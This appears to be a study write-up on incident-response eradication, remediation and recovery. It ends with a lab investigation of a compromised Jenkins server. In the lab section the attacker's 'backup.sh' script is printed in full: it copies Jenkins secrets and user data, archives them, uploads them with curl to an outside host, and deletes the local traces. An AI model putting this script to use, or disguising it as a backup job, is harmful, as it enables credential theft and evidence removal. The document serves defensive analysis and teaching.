# Eradication and Remediation

## Overview

After identifying the full scope of an incident and containing all compromised systems, the next objective is to remove the threat actor and their artifacts from the environment.

Eradication is one of the most important phases of the Incident Response lifecycle. However, it is also one of the easiest phases to execute incorrectly. The chosen approach depends on factors such as:

- The scope and severity of the compromise
- The criticality of affected systems
- Available threat intelligence
- Acceptable system downtime
- The risk of alerting the threat actor
- The business impact of the incident

There is no single eradication method that is suitable for every incident.

---

## Risks of Premature Eradication

The Incident Response team must understand the complete scope of the compromise before beginning eradication.

Starting eradication too early may alert the threat actor and cause them to:

- Accelerate data exfiltration
- Destroy systems or evidence
- Cause additional damage
- Deploy more persistence mechanisms
- Move to other systems within the network
- Change their tactics to avoid detection

Premature eradication can also create a **whack-a-mole cycle**. In this situation, the security team repeatedly discovers and removes malicious activity, only to find it elsewhere in the environment.

This does not eliminate the incident. It merely displaces the attacker’s activity.

A successful eradication plan must therefore be intelligence-driven and based on accurate scoping.

---

## Preparing for Initial Failure

Even when the Identification and Scoping phase has been completed carefully, the first remediation attempt may fail.

If malicious activity is discovered after eradication begins, the Incident Response team should return to the scoping phase and investigate the new evidence. This demonstrates the continuous feedback loop between:

- Identification and Scoping
- Threat Intelligence
- Containment
- Eradication and Remediation

Incident response is not always a linear process. New findings may require the team to repeat earlier phases and update the remediation plan.

The team should also expect the threat actor to attempt another attack after the original compromise has been removed. Future attacks may use more sophisticated techniques designed to bypass existing detections.

---

## Main Goals

The eradication and remediation phase has two primary goals:

1. **Eradicate the bad guys**

   Remove the threat actor, malicious files, persistence mechanisms, compromised accounts, and other attacker artifacts from the environment.

2. **Recover from the business impact**

   Restore affected systems and business operations to a secure and normal state.

Systems should be prioritized according to their sensitivity, criticality, dependencies, and importance to business operations.

---

# Eradication Techniques

## 1. Automated Eradication

Security tools such as antivirus and Endpoint Detection and Response solutions may automatically:

- Detect malicious files
- Quarantine malware
- Clean infected systems
- Remove known threats
- Block malicious processes

Automated eradication is most effective against less sophisticated threats that use well-known malicious tools or malware.

However, advanced and targeted threats may be specifically designed to bypass automated detection and prevention systems. Therefore, automated eradication should not be treated as the only remediation method.

### Advantage

Automated eradication allows security analysts to spend more time investigating complex threats that require manual analysis.

### Limitation

It may fail against:

- Custom malware
- Fileless techniques
- Unknown persistence mechanisms
- Targeted attacks
- Threats designed to bypass AV or EDR detection

---

## 2. Complete System Rebuild

A complete system rebuild is the most straightforward way to remove attacker traces from a compromised endpoint.

This process may include:

1. Wiping the affected system
2. Reinstalling the operating system
3. Reinstalling legitimate applications
4. Restoring approved configurations
5. Recovering data from trusted backups
6. Applying security patches
7. Validating the system before reconnecting it to the network

A rebuild provides a clean environment and reduces the possibility of leaving hidden attacker artifacts behind.

### Disadvantage: Downtime

A complete rebuild removes both malicious and legitimate content. Applications, configurations, and data must therefore be restored before the system can return to normal operation.

This creates downtime, which may be unacceptable for critical or legacy systems. In some organizations, even a few minutes of downtime may cause significant financial or operational damage.

---

## 3. Targeted System Cleanup

Targeted system cleanup removes specific attacker artifacts without completely rebuilding the affected system.

This method may be necessary when:

- The system cannot be taken offline
- Downtime would cause substantial financial loss
- Rebuilding the system is not operationally possible
- The team must avoid alerting the threat actor
- The consequences of an unsuccessful eradication attempt are severe

Potential cleanup actions may include:

- Removing malicious files
- Terminating malicious processes
- Deleting persistence mechanisms
- Disabling compromised accounts
- Resetting affected credentials
- Removing unauthorized scheduled tasks or services
- Correcting malicious configuration changes
- Applying patches to exploited vulnerabilities

Targeted cleanup must be executed with speed and precision. It should also be guided by threat intelligence collected during the investigation.

Its success depends heavily on the accuracy and completeness of the scoping phase. If attacker activity or persistence mechanisms were missed, the threat actor may retain access to the environment.

---

## Technique Comparison

| Technique | Best Used For | Main Advantage | Main Limitation |
|---|---|---|---|
| Automated Eradication | Known and less sophisticated threats | Quickly removes common malware and reduces analyst workload | May fail against custom or advanced threats |
| Complete System Rebuild | Systems requiring a trusted clean state | Provides the most comprehensive cleanup | Causes downtime and requires full restoration |
| Targeted System Cleanup | Critical systems that cannot be rebuilt or taken offline | Minimizes downtime and removes specific attacker artifacts | Depends heavily on complete and accurate scoping |

---


# Remediation and Recovery

Eradication does not end with removing attacker tools, persistence mechanisms, and other malicious artifacts. To ensure that the effects of eradication are permanent, an effective **Remediation and Recovery strategy** must be implemented alongside it.

Ideally, eradication, remediation, and recovery should be planned together and executed in a coordinated manner.

---

## Remediation

Throughout the Incident Response process, the organization gains valuable information about its security posture.

The investigation should identify:

- Vulnerabilities exploited by the threat actor
- Security misconfigurations
- Compromised accounts
- Weaknesses in access controls
- Gaps in network and endpoint visibility
- Effective detection and response capabilities

These findings should be used to develop remediation plans that close security gaps while strengthening the controls that worked successfully during the incident.

Typical remediation measures include network segmentation, Identity and Access Management reviews, and patch management.

---

## Network Segmentation

Network segmentation ensures that only necessary communication is permitted between computers, systems, and subnets.

Effective segmentation can:

- Reduce the organization’s attack surface
- Restrict lateral movement
- Isolate critical systems
- Limit unauthorized network communication
- Reduce the potential impact of a compromised endpoint
- Improve visibility into unusual network activity

Segmentation should be designed according to operational requirements. Systems should only be allowed to communicate with the resources necessary for their intended functions.

Improved network monitoring should also accompany segmentation. This helps the security team identify abnormal traffic that may indicate malicious activity.

---

## Identity and Access Management Review

### Restrict Access to Compromised Accounts

Accounts identified as compromised during the investigation must be reviewed and secured.

The original method of compromise should be identified and addressed. Examples include:

- Exposure of a plaintext password
- Credential theft
- An unpatched application running under the user’s context
- Excessive permissions
- Weak authentication controls

Possible remediation actions include:

- Resetting compromised credentials
- Revoking active sessions and tokens
- Enabling Multi-Factor Authentication
- Removing unnecessary permissions
- Reviewing recent account activity
- Correcting the vulnerability that caused the compromise

Account permissions should follow the **Principle of Least Privilege**. Users must only have access to the data, applications, and resources necessary to perform their responsibilities.

---

### Restrict Access to Highly Privileged Accounts

Highly privileged accounts, such as domain administrator accounts, require stronger access controls and auditing.

Access may be restricted through:

- Request-and-approval procedures
- Time-limited administrative privileges
- Just-in-time access
- Multi-Factor Authentication
- Privileged activity monitoring
- Regular entitlement reviews
- Dedicated administrative accounts

If a threat actor compromises a highly privileged account, they may gain extensive control over the environment. Restricting and monitoring privileged access reduces this risk.

---

## Patch Management

Removing malicious artifacts does not resolve the incident’s root cause if the vulnerability originally exploited by the attacker remains present.

Known vulnerable applications and systems should be patched as a priority. Patches should be deployed across the entire environment where the vulnerable software exists, rather than only on confirmed compromised endpoints.

An effective patch-management process should:

1. Maintain an inventory of systems and applications
2. Monitor newly disclosed vulnerabilities
3. Assess each vulnerability’s severity and exposure
4. Prioritize critical patches
5. Test patches before widespread deployment
6. Deploy patches across affected systems
7. Verify successful installation
8. Document exceptions and outstanding risks

Without proper patch management, the same vulnerability may be exploited again by the original attacker or another threat actor.

---

# Recovery

The recovery phase focuses on safely returning affected systems to production and restoring normal business operations.

Security changes implemented during remediation should be verified before systems are brought back online. The Incident Response team must ensure that:

1. All remediation measures were implemented correctly.
2. No malicious artifacts or security weaknesses were overlooked.
3. Recovered systems are safe to reconnect to the production environment.
4. Business operations can resume without reintroducing the original risk.

---

## Continuous Testing and Monitoring

After vulnerabilities have been remediated, the organization must test whether the newly implemented security controls can withstand similar attacks.

Testing methods include:

- Penetration tests
- Attack simulations
- Vulnerability assessments
- Detection validation
- Security-control testing
- Continuous monitoring

These activities create a feedback loop that continuously tests and improves the organization’s defensive capabilities.

Systems should only be returned to production after the security team is satisfied that the remediation measures are effective. Testing should continue after recovery and should also be performed across the wider environment.

---

## Backups and System Restoration

Backups are essential for returning compromised systems to normal operation, particularly when a complete system rebuild has been performed.

Organizations should maintain backups of:

- Business data
- System configurations
- Application settings
- Critical dependencies
- Unique system setups
- Recovery scripts
- Approved baseline images

Documentation is valuable, but automated deployment and configuration scripts can make recovery faster, more accurate, and more consistent.

For cloud environments, updated baseline system images can be used to rebuild affected resources from a known and trusted state.

Before restoration, backups and baseline images should be verified to ensure they are trusted and do not contain attacker artifacts.

---

## Action Plan for Recovery

Recovery activities may require cooperation between security, IT, operations, management, and other business teams. Some changes can be implemented immediately, while others may require extensive testing, additional resources, and executive approval.

Recovery actions should be divided into three categories:

| Time Frame | Purpose | Example Actions |
|---|---|---|
| Near-term | Address immediate and critical risks | Reset compromised credentials, patch critical vulnerabilities, revoke malicious access, and increase monitoring |
| Mid-term | Strengthen affected systems and security controls | Improve network segmentation, review privileges, deploy additional detections, and test restored systems |
| Long-term | Improve the organization’s overall resilience | Modernize legacy systems, redesign network architecture, automate recovery, and mature the patch-management program |

Near-term actions should focus on the most critical risks and changes that provide immediate security value.

Recovery is not a race or a one-time activity. It is a continuous process that should be prioritized according to the organization’s capacity, business requirements, and risk exposure.

---

## Key Takeaways

- Eradication, remediation, and recovery should be planned together.
- Remediation addresses the vulnerabilities and misconfigurations that enabled the incident.
- Network segmentation reduces the attack surface and restricts lateral movement.
- Account permissions should follow the Principle of Least Privilege.
- Highly privileged accounts require strict access controls and auditing.
- Vulnerabilities should be patched across the entire environment.
- Penetration tests and attack simulations validate remediation measures.
- Systems should only return to production after security controls have been verified.
- Trusted backups, automated setup scripts, and baseline images improve recovery.
- Recovery actions should be organized into near-, mid-, and long-term plans.

---

## Knowledge Check

**What should accompany eradication techniques to ensure their effects last?**

`Remediation and Recovery strategy`

**Which remediation step ensures that only necessary communication occurs between computers and subnets?**

`Network segmentation`

**Which principle states that accounts should only access necessary data, applications, and resources?**

`Principle of least privilege`

**Remediation changes are intended to strengthen what aspect of the organization?**

`Security posture`

**Which tests can verify whether remediation tactics are effective?**

`Penetration tests and attack simulations`


## Practical Investigation: Compromised Jenkins Server

### Scenario

A Linux server hosting Jenkins was investigated after the `swiftspend_admin` account was exposed through a plaintext-password misconfiguration on another system.

The same credentials had been reused across multiple platforms, allowing the threat actor to authenticate to the Jenkins server using valid credentials.

The investigation objectives were to:

- Confirm the account used to gain an initial foothold
- Examine Jenkins users and configuration files
- Identify suspicious Jenkins projects
- Analyze the commands and scripts configured for execution
- Identify external infrastructure
- Determine the attacker’s objective
- Develop eradication, remediation, and recovery recommendations

> The Jenkins administrator password was retrieved from the lab environment but is intentionally not disclosed in this report.

---

### Initial Foothold

The account that provided the threat actor with an initial foothold was:

```text
swiftspend_admin
```

The account’s password had been stored in plaintext on another system and reused across multiple platforms.

This exposed several security weaknesses:

- Plaintext credential storage
- Password reuse
- Missing Multi-Factor Authentication
- Inadequate separation of administrative accounts
- Weak Identity and Access Management controls

---

### Jenkins User Investigation

The Jenkins user configuration files were searched for additional accounts and associated email addresses:

```bash
sudo grep -RniE "emailAddress|mail|email" /var/lib/jenkins/users 2>/dev/null
```

The investigation identified another Jenkins account:

| Field | Value |
|---|---|
| Username | `infraadmin` |
| Email address | `infra_admin@swiftspend.finance` |

<img width="1702" height="123" alt="jenkins-infraadmin-email png" src="https://github.com/user-attachments/assets/8c7917a3-58ea-4297-80d2-78fa55b4c22a" />

The account should be reviewed to determine whether it was legitimately created, whether it was accessed during the incident, and whether its permissions were appropriate.

---

### Suspicious Jenkins Project

The Jenkins job configuration files were searched for shell commands:

```bash
sudo grep -Rni -A10 -B5 "<command>" /var/lib/jenkins/jobs 2>/dev/null
```

A project named `BackUp` was identified. Its configuration invoked the following command:

```bash
/bin/bash /var/lib/jenkins/backup.sh
```

<img width="1116" height="275" alt="jenkins-backup-job-command" src="https://github.com/user-attachments/assets/e8d0e16c-a056-4ad9-90ca-6eaeb5d1f4b2" />

Although the project appeared to perform a legitimate backup operation, its underlying script required further investigation.

---

### Build History

The build directory belonging to the `BackUp` project was examined:

```bash
sudo ls -la /var/lib/jenkins/jobs/BackUp/builds
```

The directory contained Jenkins metadata but no numbered build directories. This indicated that the project had not previously completed a recorded build.

| Project | Recorded executions |
|---|---:|
| `BackUp` | 0 |

<img width="897" height="131" alt="sudo ls" src="https://github.com/user-attachments/assets/3cf79be9-b448-4a5f-adc4-42a5c6fb1c7e" />

Although the project had no recorded executions, its configuration and associated script demonstrated that it had been prepared to perform malicious activity when triggered.

---

### Malicious Script Analysis

The script invoked by the Jenkins project was examined:

```bash
sudo cat /var/lib/jenkins/backup.sh
```

The script performed four significant operations.

#### Data Collection

The script created a staging directory and copied sensitive Jenkins information into it, including:

- Jenkins XML configuration files
- Job configurations
- Node information
- Installed plugins
- Files from the Jenkins secrets directory
- Jenkins user information

The following commands performed the collection:

```bash
mkdir /var/lib/jenkins/backup
mkdir /var/lib/jenkins/backup/jobs \
      /var/lib/jenkins/backup/nodes \
      /var/lib/jenkins/backup/plugins \
      /var/lib/jenkins/backup/secrets \
      /var/lib/jenkins/backup/users

cp /var/lib/jenkins/*.xml /var/lib/jenkins/backup/
cp -r /var/lib/jenkins/jobs/ /var/lib/jenkins/backup/jobs/
cp -r /var/lib/jenkins/nodes/ /var/lib/jenkins/backup/nodes/
cp /var/lib/jenkins/plugins/*.jpi /var/lib/jenkins/backup/plugins/
cp /var/lib/jenkins/secrets/* /var/lib/jenkins/backup/secrets/
cp -r /var/lib/jenkins/users/* /var/lib/jenkins/backup/users/
```

#### Archive Creation

The collected information was compressed into an archive:

```bash
tar czvf backup.tar.gz backup/
```

#### Data Exfiltration

The archive was uploaded to an external server using an HTTP POST request:

```bash
curl -XPOST http://backup.swiftspend.com:6996/upload \
-F 'files=@backup.tar.gz'
```

#### Artifact Removal

After the upload attempt, the script deleted the staging directory and archive:

```bash
rm -rf /var/lib/jenkins/backup/
rm -rf /var/lib/jenkins/backup.tar.gz
```

<img width="1621" height="445" alt="jenkins-backup-data-exfiltration-script png" src="https://github.com/user-attachments/assets/0d2742a7-19ac-4a00-9c22-6f34daa54097" />

The deletion commands indicate an attempt to remove local artifacts after exfiltration. The project name `BackUp` served as a misleading description for activity designed to collect and transfer sensitive Jenkins information.

---

### Suspicious Infrastructure

The external domain found in the script was resolved from the affected server:

```bash
getent hosts backup.swiftspend.com
```

The domain resolved to the following IP address:

| Indicator type | Value |
|---|---|
| Domain | `backup.swiftspend.com` |
| IP address | `194.26.135.132` |
| Destination port | `6996` |
| Protocol | HTTP |
| Upload path | `/upload` |

<img width="739" height="48" alt="backup swiftspend com" src="https://github.com/user-attachments/assets/6d6a86e7-9d5d-49ca-a557-078b953741c5" />

The IP address was then investigated using AbuseIPDB. Its recorded location was:

```text
Russian Federation
```

<img width="1355" height="693" alt="abuseipdb-suspicious-ip" src="https://github.com/user-attachments/assets/475420d9-cea0-4308-908d-32c6415bfe56" />

The domain, IP address, destination port, and HTTP upload path were preserved as Indicators of Compromise.

---

### Indicators of Compromise

| Type | Indicator | Context |
|---|---|---|
| Compromised account | `swiftspend_admin` | Account exposed through plaintext-password storage and credential reuse |
| Jenkins account | `infraadmin` | Additional account identified in the Jenkins configuration |
| Email address | `infra_admin@swiftspend.finance` | Email associated with the additional Jenkins account |
| Jenkins project | `BackUp` | Suspicious project configured to invoke the script |
| Script | `/var/lib/jenkins/backup.sh` | Collected and exfiltrated sensitive Jenkins information |
| Staging directory | `/var/lib/jenkins/backup/` | Temporary directory used to stage collected data |
| Archive | `backup.tar.gz` | Archive containing the collected Jenkins information |
| Domain | `backup.swiftspend.com` | External upload destination |
| IP address | `194.26.135.132` | IP address associated with the exfiltration domain |
| Port | `6996/TCP` | Destination port used by the upload command |
| URI path | `/upload` | HTTP endpoint used for the exfiltration attempt |

---

### MITRE ATT&CK Assessment

The primary MITRE ATT&CK tactic demonstrated by the script was:

```text
Exfiltration
```

The script collected sensitive Jenkins information, archived it, and attempted to transfer it to an external server.

| Observed behavior | ATT&CK context |
|---|---|
| Copying Jenkins configurations, users, and secrets | Collection |
| Creating `backup.tar.gz` | Archive Collected Data |
| Uploading the archive with `curl` | Exfiltration Over Web Service or Web Protocol |
| Deleting the staging directory and archive | Indicator Removal |

---

### Cyber Kill Chain Assessment

According to the Lockheed Martin Cyber Kill Chain, the threat actor had reached:

```text
Actions on Objectives
```

The threat actor had already obtained access to the server and prepared a Jenkins project to collect and exfiltrate sensitive information. This represented activity intended to accomplish the attacker’s final objective rather than merely establish access.

---

### Key Findings

| Question | Finding |
|---|---|
| Account that provided the foothold | `swiftspend_admin` |
| Other Jenkins account | `infraadmin` |
| Email address of the other account | `infra_admin@swiftspend.finance` |
| Suspicious Jenkins project | `BackUp` |
| Command invoked by the project | `/bin/bash /var/lib/jenkins/backup.sh` |
| Previous recorded project executions | `0` |
| Exfiltration domain | `backup.swiftspend.com` |
| Suspicious IP address | `194.26.135.132` |
| Country recorded by AbuseIPDB | `Russian Federation` |
| MITRE ATT&CK tactic | `Exfiltration` |
| Cyber Kill Chain phase | `Actions on Objectives` |

---

### Eradication Plan

The following eradication actions should be performed after preserving all required forensic evidence:

1. Disable or reset the compromised `swiftspend_admin` account.
2. Revoke active sessions, tokens, passwords, and SSH keys associated with the account.
3. Preserve the `BackUp` job configuration and `backup.sh` as evidence.
4. Remove the malicious Jenkins project.
5. Remove `/var/lib/jenkins/backup.sh`.
6. Remove residual copies of `backup.tar.gz`.
7. Remove the temporary `/var/lib/jenkins/backup/` staging directory.
8. Block communication with `backup.swiftspend.com`.
9. Block `194.26.135.132` and destination port `6996` where operationally appropriate.
10. Review the `infraadmin` account and all other Jenkins users.
11. Search the wider environment for the identified indicators.
12. Review Jenkins, proxy, DNS, firewall, and network logs for evidence of successful exfiltration.

---

### Remediation Plan

To address the weaknesses that enabled the compromise, the organization should:

- Eliminate plaintext-password storage.
- Prohibit password reuse between platforms.
- Rotate every credential reused by `swiftspend_admin`.
- Enable Multi-Factor Authentication for administrative access.
- Apply the Principle of Least Privilege.
- Use separate accounts for Jenkins and operating-system administration.
- Audit Jenkins users, jobs, credentials, plugins, and scheduled triggers.
- Patch Jenkins and all installed plugins.
- Restrict outbound network communication from the Jenkins server.
- Segment Jenkins from unrelated systems and subnets.
- Introduce alerts for unauthorized Jenkins configuration changes.
- Monitor access to the Jenkins secrets directory.
- Detect suspicious use of `curl`, archive utilities, and deletion commands.
- Review privileged accounts through a request-and-approval process.

---

### Recovery Plan

Before returning the server to production, the organization should:

1. Determine whether the integrity of the existing Jenkins installation can be trusted.
2. Rebuild Jenkins from a trusted baseline if complete integrity cannot be established.
3. Restore only verified configurations and data.
4. Rotate Jenkins credentials, API tokens, secrets, and keys.
5. Validate that the malicious project, script, and indicators have been removed.
6. Test the remediated environment through penetration testing or attack simulation.
7. Confirm that outbound filtering blocks the identified infrastructure.
8. Monitor the recovered server for repeated or modified attacker activity.
9. Reintroduce the server into production only after security validation is complete.

---

### Investigation Summary

The investigation confirmed that the reuse of the compromised `swiftspend_admin` credentials provided the initial foothold on the Jenkins server.

An additional Jenkins account named `infraadmin`, associated with `infra_admin@swiftspend.finance`, was identified during the review of Jenkins user configuration files.

A suspicious Jenkins project named `BackUp` was configured to invoke `/bin/bash /var/lib/jenkins/backup.sh`. Although the project had no recorded executions, the script was prepared to collect Jenkins configuration files, jobs, plugins, secrets, and user information.

The collected data was compressed into `backup.tar.gz` and prepared for transmission to `backup.swiftspend.com:6996/upload`. The domain resolved to `194.26.135.132`, which AbuseIPDB associated with the `Russian Federation`. The script then attempted to remove the temporary staging directory and archive.

The activity was classified under the MITRE ATT&CK **Exfiltration** tactic and the Lockheed Martin Cyber Kill Chain **Actions on Objectives** phase. Immediate credential rotation, removal of malicious Jenkins artifacts, infrastructure blocking, environment-wide threat hunting, and validation of the recovered server were recommended.


<img width="1451" height="45" alt="Ekran görüntüsü 2026-08-07 222756" src="https://github.com/user-attachments/assets/4e8ff849-e068-47f6-9829-f5a8333846cd" />



















